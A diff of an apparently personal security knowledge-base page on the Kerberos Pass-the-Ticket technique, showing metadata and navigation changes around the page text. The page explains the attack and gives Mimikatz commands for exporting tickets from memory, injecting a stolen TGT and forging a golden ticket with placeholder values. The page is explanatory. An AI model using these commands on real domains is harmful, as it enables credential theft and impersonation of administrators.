@@ -3,11 +3,11 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:57 -->
+<!-- 2026-07-30 Thu 22:15 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Pass-the-Ticket</title>
-<meta name="author" content="termux" />
+<meta name="author" content="Gregory Hugaerts" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" href="style.css" type="text/css"/>
 <style type='text/css'>
@@ -860,6 +860,24 @@ pre {
 </head>
 <body>
 <div id="preamble" class="status">
+<div id='generated-header' class='generated'><header>
+ <nav>
+<a class='nav-title'href='/index.html' >
+Gregory Hugaerts
+</a>
+<input id='nav-toggle-top' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-top'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+<li class='nav-item'>
+<a class='nav-link' href='/index.html'>
+Knowledge Base</a>
+</li>
+</ul>
+<div class='separator'></div>
+</nav>
+</header>
+</div>
 <div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
 </div>
 <div id="content" class="content">
@@ -868,19 +886,19 @@ pre {
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgdc3b005">Pass-the-Ticket</a>
+<li><a href="#orgbf92191">Pass-the-Ticket</a>
 <ul>
-<li><a href="#org2132522">Description</a>
+<li><a href="#orgcbc9654">Description</a>
 <ul>
-<li><a href="#orgbb5def3">How it Works</a></li>
-<li><a href="#org78cd101">Key Advantages for Attackers</a></li>
+<li><a href="#orgb3b1f76">How it Works</a></li>
+<li><a href="#org3e8b0c6">Key Advantages for Attackers</a></li>
 </ul>
 </li>
-<li><a href="#orgab4efbb">Examples</a>
+<li><a href="#orgc489465">Examples</a>
 <ul>
-<li><a href="#orgdb18665">. Exporting Tickets with Mimikatz</a></li>
-<li><a href="#org7f69919">2. Injecting a Ticket</a></li>
-<li><a href="#orgbc7333e">3. Golden Ticket Attack</a></li>
+<li><a href="#org960f5ad">1. Exporting Tickets with Mimikatz</a></li>
+<li><a href="#org28c5e56">2. Injecting a Ticket</a></li>
+<li><a href="#org96f1474">3. Golden Ticket Attack</a></li>
 </ul>
 </li>
 </ul>
@@ -888,20 +906,20 @@ pre {
 </ul>
 </div>
 </div>
-<div id="outline-container-orgdc3b005" class="outline-2">
-<h2 id="orgdc3b005">Pass-the-Ticket</h2>
-<div class="outline-text-2" id="text-orgdc3b005">
+<div id="outline-container-orgbf92191" class="outline-2">
+<h2 id="orgbf92191">Pass-the-Ticket</h2>
+<div class="outline-text-2" id="text-orgbf92191">
 </div>
-<div id="outline-container-org2132522" class="outline-3">
-<h3 id="org2132522">Description</h3>
-<div class="outline-text-3" id="text-org2132522">
+<div id="outline-container-orgcbc9654" class="outline-3">
+<h3 id="orgcbc9654">Description</h3>
+<div class="outline-text-3" id="text-orgcbc9654">
 <p>
-Unlike , which targets the NTLM authentication protocol, <b>Pass-the-Ticket</b> targets the <b>Kerberos</b> protocol, which is the default authentication method in modern Active Directory environments.
+Unlike <a href="20260314T005738--pass-the-hash__cybersecurity_technique.html">Pass-the-Hash</a>, which targets the NTLM authentication protocol, <b>Pass-the-Ticket</b> targets the <b>Kerberos</b> protocol, which is the default authentication method in modern Active Directory environments.
 </p>
 </div>
-<div id="outline-container-orgbb5def3" class="outline-4">
-<h4 id="orgbb5def3">How it Works</h4>
-<div class="outline-text-4" id="text-orgbb5def3">
+<div id="outline-container-orgb3b1f76" class="outline-4">
+<h4 id="orgb3b1f76">How it Works</h4>
+<div class="outline-text-4" id="text-orgb3b1f76">
 <p>
 In a Kerberos environment, when a user logs in, they receive a <b>Ticket-Granting Ticket (TGT)</b>. This ticket is stored in the memory of the LSASS process. When the user wants to access a resource (like a file share), their system presents the TGT to the Domain Controller to get a <b>Service Ticket</b>.
 </p>
@@ -917,9 +935,9 @@ In a Pass-the-Ticket attack:
 </ol>
 </div>
 </div>
-<div id="outline-container-org78cd101" class="outline-4">
-<h4 id="org78cd101">Key Advantages for Attackers</h4>
-<div class="outline-text-4" id="text-org78cd101">
+<div id="outline-container-org3e8b0c6" class="outline-4">
+<h4 id="org3e8b0c6">Key Advantages for Attackers</h4>
+<div class="outline-text-4" id="text-org3e8b0c6">
 <ul class="org-ul">
 <li><b>Bypasses MFA:</b> Since the ticket is generated <i>after</i> initial authentication, injecting a valid ticket bypasses the need for multi-factor authentication.</li>
 <li><b>No Password/Hash Required:</b> The attacker never needs to see the user's actual credentials or NTLM hashes.</li>
@@ -930,72 +948,72 @@ In a Pass-the-Ticket attack:
 </div>
 </div>
 </div>
-<div id="outline-container-orgab4efbb" class="outline-3">
-<h3 id="orgab4efbb">Examples</h3>
-<div class="outline-text-3" id="text-orgab4efbb">
+<div id="outline-container-orgc489465" class="outline-3">
+<h3 id="orgc489465">Examples</h3>
+<div class="outline-text-3" id="text-orgc489465">
 </div>
-<div id="outline-container-orgdb18665" class="outline-4">
-<h4 id="orgdb18665">. Exporting Tickets with Mimikatz</h4>
-<div class="outline-text-4" id="text-orgdb18665">
+<div id="outline-container-org960f5ad" class="outline-4">
+<h4 id="org960f5ad">1. Exporting Tickets with Mimikatz</h4>
+<div class="outline-text-4" id="text-org960f5ad">
 <p>
 To perform PtT, the attacker first harvests existing tickets from a machine where a high-value user (like a Domain Admin) has recently logged in.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_bf73a412f5bd4eda9ce6a6c76634f4ac>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_cf1ca04c73e84ff2b816f774f6cbb387>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_bf73a412f5bd4eda9ce6a6c76634f4ac=document.querySelector('button[name=btn_bf73a412f5bd4eda9ce6a6c76634f4ac]');
-copyBtnbtn_bf73a412f5bd4eda9ce6a6c76634f4ac.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Export all Kerberos tickets from memory to disk (.kirbi files)\nsekurlsa::tickets /export\n`);copyBtnbtn_bf73a412f5bd4eda9ce6a6c76634f4ac.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_bf73a412f5bd4eda9ce6a6c76634f4ac.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_cf1ca04c73e84ff2b816f774f6cbb387=document.querySelector('button[name=btn_cf1ca04c73e84ff2b816f774f6cbb387]');
+copyBtnbtn_cf1ca04c73e84ff2b816f774f6cbb387.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Export all Kerberos tickets from memory to disk (.kirbi files)\nsekurlsa::tickets /export\n`);copyBtnbtn_cf1ca04c73e84ff2b816f774f6cbb387.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cf1ca04c73e84ff2b816f774f6cbb387.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Export all Kerberos tickets from memory to disk (.kirbi files)
-</span>sekurlsa::tickets /export
+<pre class="src src-powershell"># Export all Kerberos tickets from memory to disk (.kirbi files)
+sekurlsa::tickets /export
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-org7f69919" class="outline-4">
-<h4 id="org7f69919">2. Injecting a Ticket</h4>
-<div class="outline-text-4" id="text-org7f69919">
+<div id="outline-container-org28c5e56" class="outline-4">
+<h4 id="org28c5e56">2. Injecting a Ticket</h4>
+<div class="outline-text-4" id="text-org28c5e56">
 <p>
 Once a .kirbi file is obtained, the attacker can use it on any other machine in the domain to impersonate that user.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_d5d3124c5ca745f3b58386ff71f874fb>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_36204953de74450ab94977fb1987ebcb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_d5d3124c5ca745f3b58386ff71f874fb=document.querySelector('button[name=btn_d5d3124c5ca745f3b58386ff71f874fb]');
-copyBtnbtn_d5d3124c5ca745f3b58386ff71f874fb.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Inject a specific stolen TGT into the current session\nkerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi\n`);copyBtnbtn_d5d3124c5ca745f3b58386ff71f874fb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d5d3124c5ca745f3b58386ff71f874fb.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_36204953de74450ab94977fb1987ebcb=document.querySelector('button[name=btn_36204953de74450ab94977fb1987ebcb]');
+copyBtnbtn_36204953de74450ab94977fb1987ebcb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Inject a specific stolen TGT into the current session\nkerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi\n`);copyBtnbtn_36204953de74450ab94977fb1987ebcb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_36204953de74450ab94977fb1987ebcb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Inject a specific stolen TGT into the current session
-</span>kerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
+<pre class="src src-powershell"># Inject a specific stolen TGT into the current session
+kerberos::ptt [0;12d34]-krbtgt-DOMAIN.LOCAL@DOMAIN.LOCAL.kirbi
 </pre>
 </div></div>
 </div>
 </div>
-<div id="outline-container-orgbc7333e" class="outline-4">
-<h4 id="orgbc7333e">3. Golden Ticket Attack</h4>
-<div class="outline-text-4" id="text-orgbc7333e">
+<div id="outline-container-org96f1474" class="outline-4">
+<h4 id="org96f1474">3. Golden Ticket Attack</h4>
+<div class="outline-text-4" id="text-org96f1474">
 <p>
 A "Golden Ticket" is a special, forged TGT. By stealing the NTLM hash of the krbtgt account (the service account for Kerberos), an attacker can create a ticket for any user with any permissions, usually lasting for 10 years.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_1e50202805dc48faae9674e735628b86>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_3b735a840406405e9d7eeaf2f6198abb>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_1e50202805dc48faae9674e735628b86=document.querySelector('button[name=btn_1e50202805dc48faae9674e735628b86]');
-copyBtnbtn_1e50202805dc48faae9674e735628b86.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Creating a Golden Ticket for a fake 'Administrator'\nkerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500\n`);copyBtnbtn_1e50202805dc48faae9674e735628b86.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1e50202805dc48faae9674e735628b86.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3b735a840406405e9d7eeaf2f6198abb=document.querySelector('button[name=btn_3b735a840406405e9d7eeaf2f6198abb]');
+copyBtnbtn_3b735a840406405e9d7eeaf2f6198abb.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Creating a Golden Ticket for a fake 'Administrator'\nkerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500\n`);copyBtnbtn_3b735a840406405e9d7eeaf2f6198abb.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3b735a840406405e9d7eeaf2f6198abb.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
-<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Creating a Golden Ticket for a fake 'Administrator'
-</span>kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500
+<pre class="src src-powershell"># Creating a Golden Ticket for a fake 'Administrator'
+kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-12345678-12345678-12345678 /krbtgt:ff11223344556677889900aabbccdd /id:500
 </pre>
 </div></div>
 </div>
@@ -1004,6 +1022,20 @@ let res = copyTextToClipboard(`# Creating a Golden Ticket for a fake 'Administra
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1011,6 +1043,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
